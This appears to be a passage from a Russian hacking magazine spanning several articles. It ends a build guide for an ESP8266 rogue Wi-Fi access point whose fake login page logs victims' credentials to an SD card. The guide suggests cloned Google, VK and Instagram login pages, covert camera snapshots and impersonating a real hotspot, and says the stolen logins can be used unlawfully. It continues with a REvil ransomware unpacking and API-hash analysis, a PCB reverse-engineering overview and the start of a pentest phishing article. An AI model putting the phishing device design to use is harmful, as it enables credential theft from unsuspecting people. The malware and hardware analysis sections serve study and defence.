  И последний важный момент: при использовании отдельных модулей (без
отладочной платы) имей в виду, что они также рассчитаны на питание 3,3 В.
Так что, если ты не хочешь лишний раз бежать в магазин за новой ESP‐шкой,
учти этот момент. Подобные преобра зователи можно также купить в ради‐
омагазине, их цена около 90 рублей. Вполне достаточно на 500 мА. Еще я
подумывал оснастить железяку голосовым оповещением на базе платки
WTV020, но это в дальнейшем. Будет здорово, наверное, когда система нач‐
нет общаться с тобой приятным женским голосом, сообщая об очередной
жертве в захлопнувшемся кап кане.





             Модуль зарядки с преобразова телем

Идем делать кофе: начинается самое интерес ное. :)


ШЬЕМ ОВЕЧЬЮ ШКУРУ
За основу прошивки для данного девайса был взят код, разработанный
нашим коллегой 0xRM. Код был дорабо тан и переделан в соответствии с тре‐
бованиями «Роскомнадзора» под сценарий использования в России.
  Ничего особо сложного в нем нет, самые необходимые строки проком‐
ментированы. Файл notes (это ассо циация кодов звука для зуммера) должен
лежать в одной папке с файлом прошивки и, соответс твенно, появится в окне
проекта в качестве отдельной вкладки.
  Сама веб‐страница авто ризации вместе с ее оформле нием лежит в коде
программы и закодирована в Base64 (это та самая длиннющая строка в коде,
практически нечитабельная). Все моя непомерная лень: я не стал замора‐
чиваться с переносом стра ницы авторизации в отдельный HTML‐файл. Ско‐
рее всего, сделаю это, когда буду модернизировать проект.
  ESP имеет хитрую фишку: он умеет считывать и выполнять код программы
не из своей памяти, а с SD‐карты. Я не пробовал, но не раз слышал об этом,
так что это станет поводом для дальнейших исследований. В планах сделать
несколько иной способ авторизации, а точнее, помес тить на SD‐карту
две‐три фишинговые страницы, например стра ницы авторизации Google, Vk.‐
com, Instagram, а сама стра ница входа будет предлагать авторизоваться
с помощью одного из перечисленных сайтов.
  Кроме того, после вво да данных покажем юзеру реалис тичную страницу
ошибки (нап ример, с сообщением об ошиб ке соединения), дабы не вызывать
особых подозрений. И никакая система безопасности не спалит подвох, так
как веб‐узел находится на нашем устройстве и совершенно никаких точек
соприкосновения с реальным интернетом, естес твенно, не имеет. Но все
это дело будущих усовершенствований, и при желании ты сам можешь
доработать идею на собс твенный вкус.
  Логи авторизации на нашей фишинговой стра нице хранятся на SD‐карте,
а на экране мы видим только авторизационные данные последне го зашед‐
шего и общее количество жертв. В общем, не забудь вставить в девайс карту
памяти. Код программы можно ска чать со стра ницы проекта на GitHub.
  При выборе платы контроллера в  Arduino IDE обращаем внимание
на параметры того, что мы выбрали. Ниже представлен порядок выбора
и настройки, которые используются для плат в зависи мости от их типа.





                   Нас трой ки для плат NodeMCU





                   Нас трой ки для модуля ESP‐12





                   Нас трой ки для модуля ESP‐07

Теперь о порядке работы: при запуске ты увидишь на дис плее приветствен‐
ное сообщение, после чего устройство оповес тит тебя о попытке инициали‐
зации карты памяти. Если ее нет, девайс издаст три коротких предуп‐
редительных выстрела звуковых сигнала, пос ле чего продолжится выпол‐
нение программы.
   Программа тоже будет выводить сообщения о выполняемой в данный
момент операции. После завершения всех описанных в программе действий
ты услышишь мелодию, которая оповестит, что точка дос тупа успешно запус‐
тилась и устройство готово к работе.
  На экране появится индикатор уровня заряда батареи, а также счетчик
количества подключенных клиентов и число авторизовавшихся пользовате‐
лей. Когда очередная потенциальная жертва введет данные, ты снова услы‐
шишь мелодичный сигнал, оповещающий о том, что кто‐то попал ся в нашу
ловушку. Файл с логами авторизации сохраняется на карту памяти. Пред‐
варительно она обязательно должна быть отформа тирована в FAT32, в про‐
тивном случае карта работать не будет.





                     Так выглядит устрой ство в сборе


ВЫВОДЫ
Этот проект может быть модернизирован: например, использование модулей
ESP‐07 с внешней антенной зна чительно увеличит дальность покрытия.
Гораздо страшнее эта зверюга станет, если на стра нице авторизации пред‐
лагать жертвам вой ти в сеть с помощью социальных сетей, пос ле чего
показывать фишин говую стра ницу с формой для ввода логина и пароля,
оформление которой идентично нас тоящей.
  В этом случае ты получишь учетные данные, которые потом можно исполь‐
зовать множеством способов, не все из которых законны. Кроме того, сущес‐
твуют скрипты, позволяющие делать снимки с фронтальных камер устрой‐
ства. Их можно встроить в веб‐страницы на нашем мини‐сервере.
  Еще мы можем прописать данные уже имеющейся открытой точки доступа
в нашу прошивку и поднять ее копию, при этом настоящую точку отключить
с помощью все тех же ESP8266. В общем, здесь поле непаханое, и свобода
творчества ограничивается лишь твоей фантази ей.


        WWW

                    •Библиотека для OLED
                     •Код программы для ESP8266
ВЗЛОМ

РАЗБИРАЕМ
REVIL





        Nik Zerof
    xtahi0nix@gmail.com





       КАК ИЗВЕСТНЫЙ ШИФРОВАЛЬЩИК
                ПРЯЧЕТ ВЫЗОВЫ WINAPI





Не так давно атаке подверглась международная система
денежных переводов Travelex, и виновником этого оказался
шифровальщик REvil, чем и прив лек мое внимание. Забегая
вперед, скажу, что в этом тро яне использованы простые,
но эффектив ные методы обфускации, которые не позволяют
нам так прос то увидеть используемые им вызовы WinAPI.
Давай пос мотрим, как устро ен этот энко дер изнутри.


По доброй традиции загрузим семпл в DiE и поглядим, что он нам покажет.





                              REvil в приложении DiE

DiE считает, что файл ничем не упа кован. Хотя пос той‐ка, давай переключим‐
ся на показания энтропии секций.





                    Энтро пия секций REvil

Судя по названиям секций, файл упа кован UPX, но их энтропия выглядит
очень странно. Почему тогда DiE не распознал упаковщик? Ну, например,
сигнатура UPX может быть намеренно искажена, чтобы запутать дизассем‐
блеры. Так или иначе, перед нами упакованный файл, поэтому загружаемся
в  отладчик  x64dbg.  Давай  поставим  точку  останова  на  функцию
VirtualAlloc, которая мелькает у нас в окрес тностях точки входа, и запус‐
тим троян.


             INFO

                        Есть   несколько   функций   WinAPI,   бряки
                       на которые нужно устанавливать по умолчанию
                      при  распаковке  неиз вестного  пакера,  ибо
                      механизмы распаковки достаточно стандартны:
                  •VirtualAlloc —  используется  при  выделении
                        памяти для пейлоада;
                  •VirtualProtect — использует ся для  установки
                         атрибутов доступа к памяти;
                  •CreateProcessInternalW — при создании нового
                        процесса, в эту функцию в ито ге передается
                         управление;
                  •ResumeThread — используется для продолжения
                       выполнения при инъекциях.


Брякаемся на функции и выходим из нее в наш код. В итоге видим такую кар‐
тину:


008F9552 | FF55 B4       | call dword ptr ss:[ebp‐4C]    | Virtua
lAlloc
008F9555 | 8945 F0       | mov dword ptr ss:[ebp‐10],eax | <‐‐‐‐ мы
находимся здесь
008F9558 | 8365 DC 00    | and dword ptr ss:[ebp‐24],0   |
008F955C | 8B85 58FFFFFF | mov eax,dword ptr ss:[ebp‐A8] |
008F9562 | 0FB640 01     | movzx eax,byte ptr ds:[eax+1] |

Осматриваемся дальше, видим интерес ный кусок кода в конце функции,
в которой мы оказались:


00569C10 | 8985 5CFFFFFF | mov dword ptr ss:[ebp‐A4],eax |
00569C16 | 8B85 5CFFFFFF | mov eax,dword ptr ss:[ebp‐A4] |
00569C1C | 0385 68FFFFFF | add eax,dword ptr ss:[ebp‐98] |
00569C22 | C9            | leave                         |
00569C23 | FFE0          | jmp eax                       |
Интересный переход!

Не забываем: при отра бот ке функции VirtualAlloc адрес выделенной
памяти находит ся в eax. Ставим точку оста нова на этот переход, попутно
переходим на дамп (адрес в eax) и смотрим, что будет происходить
в выделенной памяти. Для это го ставим на начале этой памяти однократную
точку останова на запись, и отладчик останавливается на цикле записи дан‐
ных в память. Вот так выглядит часть цикла:


00279DA4 | 8A11          | mov dl,byte ptr ds:[ecx]      |
00279DA6 | 8810          | mov byte ptr ds:[eax],dl      |
00279DA8 | 40            | inc eax                       |
00279DA9 | 41            | inc ecx                       |
00279DAA | 4F            | dec edi                       |
00279DAB | 75 F7         | jne 279DA4                    |

Если мы станем вручную прокручивать цикл, в памяти начнет проявляться
до боли знакомая сигнатура:


003C0000  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00
MZ..........yy..

Отпускаем отладчик и останавливаемся на jmp eax, делаем шаг впе ред —
и мы в распакованном файле! Теперь можно снимать дамп и загружать его
в IDA Pro. Выполнив эту нехит рую процеду ру, мы увидим код стартовой фун‐
кции:


public start
start proc near
push    0
call    sub_40369D
push    0
call    sub_403EEF
pop     ecx
retn
start endp

Исследование функций и воз можнос тей нашего вредоноса надо с чего‐то
начинать, поэтому заходим в первый call. Там нас ждет уже более интерес‐
ный код:


sub_40369D proc near
call    sub_406A4D    // Перед вызовом функции по хешу есть только
одна подпрограмма; очевидно, все самое интересное спрятано здесь :)
push    1
call    dword_41CB64  // Хм, что это?
call    sub_40489C
test    eax, eax
jz      short loc_4036BD
...
...

Видим вызов подпрограммы sub_406A4D, далее вызов такого рода: call
dword_41CB64. Очевидно, что если все «оста вить как есть», то здесь при‐
ложение упадет при выполнении, потому что dword_41CB64 ведет на таблицу
такого рода (это только часть таблицы!):


.data:0041CB64 dword_41CB64  dd 40D32A7Dh  ; DATA XREF: sub_40
369D+7↑r
.data:0041CB68 dword_41CB68  dd 0C97676C4h ; DATA XREF: sub_40
3EE1+6↑r
.data:0041CB6C dword_41CB6C  dd 0D69D6931h ; DATA XREF: sub_40
3BC0+15↑r
.data:0041CB70 dword_41CB70  dd 8AABE016h  ; DATA XREF: sub_40
6299+C0↑r
...
...

Кроме того, в нашем обра зе таблица импорта пустая: разумеется, функции
WinAPI получаются динамичес ки, имена функций не хранятся в откры том
виде, и, похоже, исполь зуются их хеши. На самом деле «Хакер» уже описывал
подобную технику об фуска ции вызовов WinAPI, следовательно, нашим пос‐
тоянным читателям будет проще разобрать ся в устройстве REvil. Итак, ныря‐
ем в функцию sub_406A4D, видим там один безус ловный переход и следуем
дальше в sub_405BCD. Практически в начале функции видим очень интерес‐
ный код:


loc_405BD6:
// Кладем на стек элемент из таблицы хешей, на которую указывает ESI
push    dword_41C9F8[esi]
// Работаем над этими данными, обработанное значение вернется в EAX
call    sub_405DCF
// Возвращаем обратно
mov     dword_41C9F8[esi], eax
// Идем по списку дальше (шагаем по четыре байта)
add     esi, 4
pop     ecx
cmp     esi, 230h
jb      short loc_405BD6

Разумеется, мы не можем не заглянуть в функцию sub_405DCF. Там мы видим
целую портянку кода, поэто му придется переключить ся в декомпилированный
псевдокод, чтобы не погрязнуть в этом болоте с головой. Конечно, если ты
гуру ассемблера и тебе не составляет тру да читать много кода на этом языке,
можешь оставить все как есть, а лично мне при вычнее псевдокод IDA Pro.
  Функция большая, поэто му полностью приводить ее в статье не имеет
смысла, но мы можем сконцентрировать ся на ее основных час тях. Работу
функции можно разделить на два этапа. Первый — трансформация име ющих‐
ся хеш‐сумм, указанных в программе. Второй — получение из таблицы
экспорта системных библиотек имен функций, хеширование и сверка с шаб‐
лонами, полученными из таблицы, которую мы уже видели.
  Парсинг таб лицы экспорта системной биб лиотеки на псевдокоде выглядит
таким образом:


v17 = (IMAGE_EXPORT_DIRECTORY *)(v13 + *(_DWORD *)(*(_DWORD *)(v13 +
0x3C) + v13 + 0x78));
v21 = (int)v17‐>AddressOfNameOrdinals + v13;
v18 = (int)v17‐>AddressOfNames + v13;
v22 = (int)v17‐>AddressOfNames + v13;
v20 = (int)v17‐>AddressOfFunctions + v13;
v23 = v17‐>NumberOfNames;
if ( !v23 )
  return 0;
while ( (sub_405BAE(v14 + *(_DWORD *)(v18 + 4 * v16)) & 0x1FFFFF) !=
v15 ){
  v18 = v22;
  if ( ++v16 >= v23 )
    return 0;
}

Почему именно этот кусок псевдокода привлек мое внимание? Разумеется,
бросаются в глаза такие смещения, как 0x3C или 0x78. Кроме того, перемен‐
ная v13, работающая с этими числами, приводится к типу DWORD*, говоря нам,
что мы смотрим на некое смещение. Разумеется, все указывает на заголовок
PE‐файла:


0x00  WORD  emagic     Magic DOS signature MZ (0x4d 0x5A)
0x02  WORD  e_cblp     Bytes on last page of file
0x04  WORD  e_cp       Pages in file
0x06  WORD  e_crlc     Relocations
0x08  WORD  e_cparhdr  Size of header in paragraphs
0x0A  WORD  e_minalloc Minimum extra paragraphs needed
0x0C  WORD  e_maxalloc Maximum extra paragraphs needed
0x0E  WORD  e_ss       Initial (relative) SS value
0x10  WORD  e_sp       Initial SP value
0x12  WORD  e_csum     Checksum
0x14  WORD  e_ip       Initial IP value
0x16  WORD  e_cs       Initial (relative) CS value
0x18  WORD  e_lfarlc   File address of relocation table
0x1A  WORD  e_ovno     Overloay number
0x1C  WORD  e_res[4]   Reserved words (4 WORDs)
0x24  WORD  e_oemid    OEM identifier (for e_oeminfo)
0x26  WORD  e_oeminfo  OEM information; e_oemid specific
0x28  WORD  e_res2[10] Reserved words (10 WORDs)
0x3c  DWORD e_lfanew   Offset to start of PE header

В коде мы видим смещение 0x3c, которое соот ветствует полю e_lfanew.
Двигаясь далее по e_lfanew по смещению 0x78 (смотрим псевдокод), мы
видим вот такое поле:


0x78  DWORD Export Table  RVA of Export Directory

Значит, идет разбор таблицы экспорта, что говорит о динамическом получе‐
нии WinAPI.
   Чтобы IDA Pro «понимала» структуру таб лицы экспорта, ее необходимо
объявить в Local Types, нажав Shift + F1. Пос ле этого на переменной v17
нужно скомандовать из контекс тного меню Convert to struct*. Структура
таблицы экспорта PE‐файла выглядит таким обра зом:


struct IMAGE_EXPORT_DIRECTORY {
  long Characteristics;
  long TimeDateStamp;
  short MajorVersion;
  short MinorVersion;
  long Name;
  long Base;
  long NumberOfFunctions;
  long NumberOfNames;
  long *AddressOfFunctions;
  long *AddressOfNames;
  long *AddressOfNameOrdinals;
}

Как раз здесь мы видим используемые поля: *AddressOfFunctions, *Ad‐
dressOfNames и *AddressOfNameOrdinals. По псевдокоду понятно, что хеши
из уже имеющихся в коде получаются таким обра зом:


int __cdecl sub_405DCF(int (*a1)(void)){ // Передача аргумента
  ... // Много строк, которые можно пропустить
  v1 = (unsigned int)a1 ^ (((unsigned int)a1 ^ 0x76C7) << 16) ^
0xAFB9;
  ... //
  v15 = v1 & 0x1FFFFF;
  ... //
}

Да, в теле семпла используются не «готовые» хеши, их еще предстоит при‐
вести в правильный вид. Если отбросить все лишнее, мы получим сле дующий
алгоритм:


hash_api_true = (hash ^ ((hash ^ 0x76C7) << 16) ^ 0xAFB9) & 0x1FFFFF

где hash — переданный в качестве аргу мента функции хеш из таблицы.
Хорошо, что IDA подсвечивает одинаковые переменные, иначе анализ сем‐
пла занял бы намного больше времени. В псевдокоде этот хеш хранится
в переменной под име нем a1, которая является аргу ментом функции.
   Если пропустить через этот алго ритм ука занные в коде хеши (помнишь
таблицу?),  получаем  «пра вильные»  хеши,  которые  будут  сравниваться
с полученными из таблицы экспорта системной биб лиотеки, точнее, из имен
экспортируемых функций. Псевдокод получения хеша из символьного имени
функции будет выглядеть на Python так:


def hash_from_name(name):
  result  = 0x2b
  for x in name:
    result = ord(c) + 0x10f * result
  return result & 0x1FFFFF

Вызов функции:


hash_from_name(name) # Name — переменная, содержащая символьное имя
функции

Итак, нам осталось лишь пропус тить всю таблицу представленных в семпле
псевдохешей через алгоритм hash_api_true и сос тавить уже таб лицу «пра‐
вильных» хешей. Далее нужно пропус тить список функций WinAPI, состоящий
из обычных символь ных имен, через алгоритм hash_from_name, получив
хешированные име на. Заключительная часть — надо сопоставить эти два
списка, таким образом декодируя имена и хеш‐представления. Разумеется,
удобнее всего это сделать с помощью питоновского скрипта для IDA, а не
вручную.

Мож но ли сде лать быс трее?
Конкретно в дан ном случае REvil строит таблицу деобфусцированных функций
сразу целиком. Поэтому, загрузив семпл в отладчик, можно исполнить под‐
программу получения и деоб фускации WinAPI‐функций, после чего отладчик
автоматом подставит уже расшифрованные имена функций API в код. Затем
можно снять дамп и работать уже с ним, функции будут при сутствовать
на своих местах. Но этот способ подходит далеко не всегда. Например, если
деобфускация выполняет ся не сразу со всем списком используемых фун‐
кций, а с каждой функцией по отдельности, по мере ее вызова, этот при ем
уже не сработает. Кстати, именно так и было сделано в статье про об фуска‐
цию вызовов WinAPI.



ЗАКЛЮЧЕНИЕ
В этой статье мы разоб рали, каким образом вос становить вызовы WinAPI,
которые обфусцированы методом обра щения по их хешам. Как видишь, такой
метод обфускации достаточно легко преодо левается при помощи отладчи ка
или дизассемблера, при том что реверсера не оста навливают математичес‐
кие манипуляции с хешем. Подобные вещи прекрасно видны в псевдокоде
и замедляют иссле дование семпла раз ве что на пару минут. На самом деле
подобные приемы направлены на противо дей ствие автоматическим сис‐
темам обнаруже ния, но практичес ки никак не затрудня ют анализ «вручную».
ВЗЛОМ
ЖЕЛЕЗНЫЙ
  ЗАНАВЕС

           КАК ПРОИЗВОДИТЕЛИ МЕШАЮТ
                ВЗЛАМЫВАТЬ ГАДЖЕТЫ





                                                                           Александр Бурага
                                                                                       Инженер‐конструктор
                                                                                  радиоэлектронной техники. С
                                                                                вниманием следит за
                                                                                  прогрессом IoT и носимой
                                                                                               электроники.
                                                                                           dtp‐avb@yandex.ru





Возможно, ты в детстве разбирал всякие вещи, чтобы
узнать, как они сделаны, — за что тебе наверняка влетало.
Взрослым  дядькам  такое  развле чение тоже не  чуждо,
и называется оно «реверс‐инжиниринг», или «обратная раз‐
работка». О реверсе софта мы в «Хакере» периодически
пишем, но реверс железа ничуть не менее интересен.
Из этой статьи ты узнаешь об актуальных способах ревер‐
синга печатных плат и о том, как ему про тиводействуют раз‐
работчики.


Формальное определение реверс‐инжинирин га звучит так: это процесс вос‐
становления схе мы и идентификации компонентов при отсутс твии пол ного
комплекта документации. Зачем это нуж но, если тебе не восемь лет и перед
тобой не разобранный отцовский ноут бук? Как правило — чтобы своровать
схемотехнику приглянувшегося устройства и продать ее какому‐нибудь про‐
изводителю либо выдать за свое. Реже — усовершенствовать и наладить
выпуск аналога.
   Также реверс‐инжиниринг позволяет выявить клю чевые эле менты схе мы,
которые откроют доступ, например, к цепям JTAG, заг рузочной ПЗУ или ОЗУ.
Или же целью может быть внедрение аппа рат ных троянов, которые изменяют
функции устройства, — чтобы, например, превратить внешний накопитель
во флешку‐убийцу, а кабель HDMI — в средс тво анализа выводи мого
на экран содержимого.


             INFO

                  Методики, сходные с применя емыми для печат‐
                      ных плат, могут использоваться для восстанов‐
                       ления  структуры мик росборок или даже мик‐
                       росхем.


Аппаратный реверсинг прошел большой  путь  от прямого копирования
до  автоматизированного  высокотехнологичного  восстановления  схемы
печатной платы. Множес тво фирм готовы помочь в этом любому желающему,
стоит заплатить им чеканной монетой.


ОСНОВЫ АППАРАТНОГО РЕВЕРС-ИНЖИНИРИНГА
Итак, печатная плата — это обычно многос лойный бутерброд из электроп‐
роводящих и изолирующих сло ев, паяльной маски и финишного покрытия,
на котором установлены электронные компоненты. Чаще всего цель ревер‐
сера — восстановить схему платы. Но начина ется процесс не с этого, а со
вскрытия и разбора корпуса, идентификации компонентов и соеди нений
между ними. На каждом из этих этапов встречают ся свои сложности.
  Реверс‐инжиниринг делят на деструктивный (после которого печатная
плата работать перестает, зато ты становишься обладателем исчерпы‐
вающей информации о ее структуре) и недеструктивный — когда о попытках
реверс‐инжиниринга никто посторонний не узна ет.


Вскры тие покажет
Для работы с самой печатной платой нужно не так много оборудования,
как может показаться. На первых порах пригодится фотоаппарат или смар‐
тфон с хорошей камерой и мультиметр.
  А вот при разборе может встретиться много раз ных препятс твий — от хит‐
роумных защелок и винтов с нес тандартны ми шлицами (например, Torx)
до совсем уж низкопробных заводских пакостей вроде заливки платы и ком‐
понентов клеями и компаундами. Бывает и так, что при ходится столкнуться
с результатами ультразвуковой сварки.
  Специалисты обычно имеют под рукой солидный набор инструментов.
В качестве примера можешь посмотреть про дукцию iFixit, а «Алиэкс пресс»
завален более дешевыми аналога ми. В самых крайних случаях специальные
инструменты изготавливаются при помощи 3D‐печати.
   Если при разборе встретится клей, то это не повод для большого
расстройства: как правило, мож но его наг реть и разъединить все, что было
склеено. Да и сварка ультраз вуком не приговор. Она обычно не дает боль‐
шой  прочности,  поэто му швы мож но  попробовать  локально  охладить
или попытаться рассоединить механически.
   Ну и конечно, не забывай заглядывать на YouTube, чтобы посмотреть,
не разбирал ли кто‐то такое устройство до тебя. Это сэкономит немало сил
и времени, а также серьезно снизит вероятность что‐то повредить.





Слева — вскрытие корпуса Xbox One, по центру — набор бит для вскрытия
электронной техники, спра ва — использование термофена для демонтажа



Иден тификация компонен тов
Как ни странно, несмотря на огромное раз нооб разие выпус каемых сов‐
ременной промышленностью компонентов, понять их назначение — не самая
сложная задача. Если на плате присутс твует маркировка, можно по названию
определить тип компонента (чип‐резис тор, чип‐конденсатор, чип‐индуктив‐
ность, диод и так далее) и попробовать оценить его номинал.
   Чтобы найти конкретную микросхему, фильтруй возможные варианты
по типу корпуса, маркировке на нем и используемой обвязке, а затем про‐
бивай похожие варианты по катало гам электронных компонентов (например,
Digikey или Mouser). Еще можно попытаться выудить информацию из мар‐
кировки на самом приборе: нередко в интернете обнаруживаются руководс‐
тва по ремонту и другая документация.


Восстановление про вод ников на печатной плате
Если у тебя есть мультиметр и много‐много терпения, восстановить схе му
электронного устрой ства на уровне соеди нений меж ду компонентами можно,
попарно проанализировав все контактные площадки на печатной плате.
Однако для получения полной информа ции о плате (чтобы, например, дальше
скопировать ее) это го недостаточно.
   Когда нужно узнать, как устроена геометрия дорожек внутри многослой‐
ной платы, ее распиливают и, про ходя слой за сло ем, восстанавливают кар‐
тину проводников. А чтобы не разрушать плату, в таких случаях может исполь‐
зоваться рентге нографичес кая установка.
   Также из оптических приборов при реверсе при меняются виде окамеры,
чувствительные к ИК‐вол нам ближнего диапазона, тепловизоры и аппараты
магнитно‐резонансной томографии (МРТ). Но большинству из нас такие
предметы роскоши доступны только в мечтах.
   Как ни странно, тексто лит довольно хорошо пропус кает свет, и если снять
с платы слой паяльной мас ки, то мож но попробовать на просвет восста‐
новить структуру трасс внутренних слоев. Мас ку уда ляют раз ными метода‐
ми — механической зачисткой, химическими рас творами или при помощи
лазера. А достаточно мощный источник света и цифровая обработка изоб‐
ражений позволяют использовать этот метод даже при сохранении маски.





Механический и химический методы удаления паяльной маски с платы (ввер‐
ху), использование автоматизированной лазерной установки (внизу)





Применение камеры высоко го раз решения и ИК‐подсветки (видно, что
паяльная маска просвечивается в ИК), изображение работающей печатной
платы в тепловизоре, защищенный электронный модуль VeriFone PIN pad
1000SE



        WWW

                  •Презентация Introduction to Reverse Engineering
                     Майка Андерсона, PDF
                  •Презентация Effective Techniques for PCB Re‐
                            verse Engineering Джо Гран да, представленная
                         на DEF CON 22
                  •Презентация Design and Reverse Engineering:
                             Playing on both sides of the ﬁeld Джереми Хонга
                  •Книги Джереми Хонга PCB‐RE: Tools & Tech‐
                            niques, The Art of PCB Reverse Engineering: Un‐
                                ravelling the Beauty of the Original Design и его
                          блог



ТЕХНОЛОГИЧЕСКИЕ МЕТОДЫ ЗАЩИТЫ
Попробуем теперь пос мотреть на проблему с точки зре ния спе циалис тов
по защите устройств от любопытных глаз и очу мелых ручек. Вот основной
список приемов, которые дос тупны производителю, желающе му защитить
свой гаджет от реверса:
 • сложный нестандартный крепеж;
 • компаунды для заливки компонентов платы;
 • исключение шелкогра фии и минимизация использования пассивных ком‐
   понентов;
 • компоненты без маркировки и микросборки (гиб ридные микросхе мы);
 • корпуса микросхем без планарных выводов;
 • многослойные печатные платы и трас сировка контактов только по внут‐
  ренним слоям;
 • слепые переходные отверстия (они же «глухие»);
 • скремблинг (перемешивание) сигналов на шинах;
 • пробрасывание линий печатных плат через ПЛИС или ASIC;
 • отключение JTAG и отла дочных портов.

От рентгеновских снимков тоже мож но защитить ся, и бывает, что разработ‐
чики делают это. В таком случае на пла ту наносят ся блокирующие экраны —
в виде непроницаемого корпуса или пленок из материалов с большим атом‐
ным числом (High‐Z), нап ример свинца, тантала или вольфрама. Альтернатив‐
ный вариант — нанесение финишного покрытия, вклю чающе го мелкие час‐
тицы High‐Z‐материалов (таких как сульфат бария) или прочих малопрозрач‐
ных для рентгена веществ.





Покрытие печат ной платы компаундом, содержащим карбид, для предотвра‐
щения реверса неинвазивным методом — без защитного покрытия и с ним
(а), рентгенов ский снимок печатной платы  (b), фрагмент рентгеновского
изображения без нанесения защитного покрытия (c) и после нанесения (d)





Нанесение экранирующего материала для защиты от реверс‐инжиниринга


Понятно, что плата, изготовленная с использованием нестандартного стека
(а вольфрамовые вставки уж точно в базовый пакет производите лей печатных
плат не входят), обой дется значитель но дороже плат, выпущенных по стан‐
дартным технологическим процес сам.
  Дороговизна не единс твенная проб лема бло кирующих покрытий. Рен‐
тген‐контроль часто применя ется для оценки качес тва монтажа компонентов
в корпусе BGA или в микросборках. Если экранировать схему, то эта техника
станет недоступна.
  Еще один способ борьбы с рентгенос копией — это особые структуры
в микросхе мах или на печат ной плате, которые перегорают, когда на них
попадает рентгеновское излучение. Они называ ются eFuse. Как вариант
могут применяться активные схемы, которые детектируют излу чение. Нап‐
ример,  на основе рентгенолю минес центных материалов,  совмещенных
с фотодетекторами.
  Кроме пассивных методов противо действия реверсу, бывают еще и ком‐
плексные. Например, защитные корпуса, которые разными способами пре‐
пятствуют вскрытию (на английском их называют anti‐tamper). Есть и схе‐
мотехнические ухищрения, которые позволяют на лету детектировать попытки
несанкционированного дос тупа к железяке.


САМЫЕ ЗАЩИЩЕННЫЕ
Наиболее изощренные технологии защиты от взлома применяются в крип‐
топроцессорах, таких как IBM 4758 PCI Cryptographic Coprocessor. Этот
девайс используется в серверных решениях, свя занных с финансовым сек‐
тором. Забавно: специалис ты оценивали срок, необ ходимый для взлома это‐
го максимально защищен ного криптопро цес сора, в 70  лет. Аспиранты
из Кембриджа справились за один день.
  А в защищенном компь ютере ORWL целостность корпуса и защита
от несанкционированного дос тупа гарантиру ется использованием экраниру‐
ющей «змейки», внедренной в полимер по технологии LDS (Laser Direct Struc‐
tioning). Это позволя ет анализировать сопротивление проводников с наруж‐
ной части корпуса или емкость корпуса. Сам он при этом обес печивает
защиту уровня IP53, то есть комар носа не подточит!
   У такой пространственной сет ки есть серь езный минус: в теории можно
закоротить электроды, которые оценивают ее целостность, и привести всю
защиту в негодность.
  Более прогрессивный вариант емкостной системы предложили в инсти‐
туте Фраунгофера. Здесь внешний корпус представляет собой композитный
«бутерброд» из помещенных в полиимид приемных и передающих электро‐
дов, дополненный металлическим экра ном. Всего — 16 пар передающих
и приемных электродов, образующих сетку из 256 емкостных датчиков
с шагом менее 1 мм.
  Измерительная цепь обеспечивает оценку абсолютной емкости, диф‐
ференциальной емкости (между узлами) и проверку целостности сигналов
(обнаружение разрывов и корот ких замыканий). Такая система не нуждается
в постоянном активном контроле, то есть может не содержать аккумуля торов,
а нарушения целостнос ти корпуса легко диагностируются во время штатной
загрузки электронного устройства.
  Испытания этой схемы прошли успешно, и она показала высокую надеж‐
ность, нечувствительность к внешним радиопомехам и попыткам зондирова‐
ния  рентгенов ским  излучением.  Также  уда лось  стабильно  опре делять
нарушения внешней оболочки в виде отверстий от 0,3 мм в диаметре, через
которые невозможно что‐либо сделать с защищенными внутренностями
модуля.


ЗАКЛЮЧЕНИЕ
Вряд ли кто‐то посчита ет достойной добычей твою самодельную базовую
плату для Arduino, а вот популярная модель смартфо на, элемент умного дома
или модный радиолюбитель ский гаджет типа SDR‐модуля или логического
анализатора — это уже дос тойный куш. Производители знают об этом и при‐
нимают разные меры для защиты.
  При этом плату можно полностью залить компаундом, обложить листами
цинка и емкостными датчиками, и это сильно осложнит жизнь исследова‐
телям, но не остановит их. Поэто му основная задача при защите устрой‐
ства — это не предотвратить исследование, а сделать его экономи чески
невыгодным.
  Защита при этом не должна ста новиться препятстви ем для решения
основной задачи. Устройство, зануляющее ключи и удаляющее пользователь‐
ские приложения при малейшем скачке напряжения или колебании тем‐
пературы, может быть и прекрасно в плане информационной безопасности,
но вот пользоваться им вряд ли будет удобно.
  Все эти нюансы делают работу по обе стороны баррикад поис тине увле‐
кательной. Надеюсь, и ты, пока читал статью, успел проникнуться этой
мыслью!
ВЗЛОМ
    СЛАБОЕ
     ЗВЕНО





                                                                                    v31_v37
                                                                                          v31v37@yandex.ru





КАК ПРАВИЛЬНО
ИСПОЛЬЗОВАТЬ
ФИШИНГОВЫЕ
РАССЫЛКИ
В РАМКАХ ПЕНТЕСТА




Народная мудрость гласит, что самый уязвимый компонент
любой информационной  системы  располагается между
компьютерным креслом и кла виатурой. Человек бывает рас‐
сеян, невнимателен, недостаточно информирован, поэтому
часто становится мишенью фишинговых атак, результаты
которых порой весьма пла чевны. Вывод очевиден: надеж‐
ность этого слабого звена нужно проверять не менее тща‐
тельно, чем конфигурацию соф та и настройку железа.


Тестирование методом социальной инженерии может либо быть отдельным
мероприятием  (сюда  входит  проверка  осведомленности  сотрудников
или проверка работы ИТ‐ и ИБ‐службы), либо стать одним из способов про‐
никновения в сеть в рамках внешнего пентеста. Быва ет, что заказчик просто
захотел исключить возможность проникновения через этот вектор либо
это направление оказывается последней надеждой, поскольку тестировщик
не сумел попасть в сеть без «помощи» сотрудни ков заказчика. Какими бы
ни были причины,  в любом  случае необ ходимо продумать  стратегию
для социальной инженерии на основе имеющей ся информации (полученной
от заказчика или соб ранной на этапе OSINT).
   Стратегия атаки может стро иться по‐раз ному в зависимос ти от различных
факторов: желания заказ чика в принципе про водить сценарии социальной
инженерии, наличия огра ничений на проведение социнженерии, достаточ‐
ности информации, соб ранной на этапе OSINT. Предположим, что заказчик
одобрил сце нарий, при котором мы рассылаем нежелательные сообщения
по электронной почте — то есть спам. В сегодняшней статье речь пойдет
о том, какие проб лемы будут ждать при рас простра нении подобных сооб‐
щений и как правильно решать эти проблемы, чтобы сообщения дошли
до сотрудников с вероятностью, близкой к ста про центам.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



ЭТАП 0. ПОСТАНОВКА ЦЕЛЕЙ
Для начала нужно решить, какие вооб ще векторы атаки применимы к текущей
ситуации. Почтовые рассылки в основном исполь зуются для двух целей:
